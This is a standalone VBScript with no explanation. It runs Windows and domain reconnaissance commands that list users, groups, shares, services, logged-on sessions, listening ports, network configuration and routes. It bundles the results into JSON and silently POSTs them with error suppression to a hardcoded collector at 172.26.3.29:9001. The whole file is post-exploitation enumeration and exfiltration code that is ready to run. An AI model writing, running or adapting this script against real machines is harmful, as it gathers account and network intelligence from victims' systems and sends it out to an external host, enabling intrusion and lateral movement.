

Set objShell = CreateObject("WScript.Shell")


Set objScriptExec = objShell.Exec("net accounts")
strNetAccounts = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("net share")
strNetShare = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("net localgroup")
strNetLocalGrp = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("net user /domain")
strNetUsr = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("net group /domain")
strNetGrp = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("tasklist /svc")
strTask = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("fsutil fsinfo drives")
strDrives = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("net time /domain")
strTime = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("net start")
strStart = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("query user")
strQuery = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("netstat -anpo tcp | findstr LISTENING")
strNetListening = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("ipconfig /all")
strIpConfig = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("route PRINT")
strRoute = objScriptExec.StdOut.ReadAll

Set objScriptExec = objShell.Exec("net config workstation")
strConfig = objScriptExec.StdOut.ReadAll


Public Function StrFormat(FormatString, Arguments())
    Dim Value, CurArgNum

    StrFormat = FormatString

    CurArgNum = 0
    For Each Value In Arguments
        StrFormat = Replace(StrFormat, "[" & CurArgNum & "]", Value)
        CurArgNum = CurArgNum + 1
    Next
End Function


formatString  = "{""netaccount"":""[0]""},{""netshare"":""[1]""},{""netlocalgroup"":""[2]""},{""netuser"":""[3]""},{""netgroup"":""[4]""},{""tasklist"":""[5]""},{""fsinfodrives"":""[6]""},{""nettime"":""[7]""},{""netstart"":""[8]""},{""queryuser"":""[9]""},{""netstat"":""[10]""},{""ipconfig"":""[11]""},{""route"":""[12]""},{""netconfig"":""[13]""}"


strFormated = StrFormat(formatString , Array(strNetAccounts, strNetShare, strNetLocalGrp, strNetUsr, strNetGrp, strTask, strDrives, strTime, strStart, strQuery, strNetListening, strIpConfig, strRoute, strConfig))

WScript.Echo strFormated

URL="http://172.26.3.29:9001/data" 
Set objXmlHttpMain = CreateObject("Msxml2.ServerXMLHTTP") 
on error resume next 
objXmlHttpMain.open "POST",URL, False 
objXmlHttpMain.setRequestHeader "Content-Type", "text/json"

objXmlHttpMain.send strFormated

set objJSONDoc = nothing 
set objResult = nothing


